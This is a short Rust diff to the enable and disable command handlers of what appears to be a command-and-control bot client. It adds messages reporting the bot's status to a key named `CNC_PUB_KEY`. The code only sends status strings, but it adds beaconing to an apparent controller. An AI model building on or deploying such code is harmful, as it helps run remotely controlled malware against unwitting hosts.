@@ -28,7 +28,10 @@ impl Command for DisableCommand {
         DisableCommand {}
     }
     async fn execute(&self, session: &Session) -> Result<()> {
-        session.update_about("I'm disabled").await?;
+        // session.update_about("I'm disabled").await?;
+        session
+            .send_msg("I'm disabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
+            .await?;
         Ok(())
     }
 }
@@ -41,6 +44,9 @@ impl Command for EnabledCommand {
     }
     async fn execute(&self, session: &Session) -> Result<()> {
         session.update_about("I'm enabled").await?;
+        session
+            .send_msg("I'm enabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
+            .await?;
         Ok(())
     }
 }
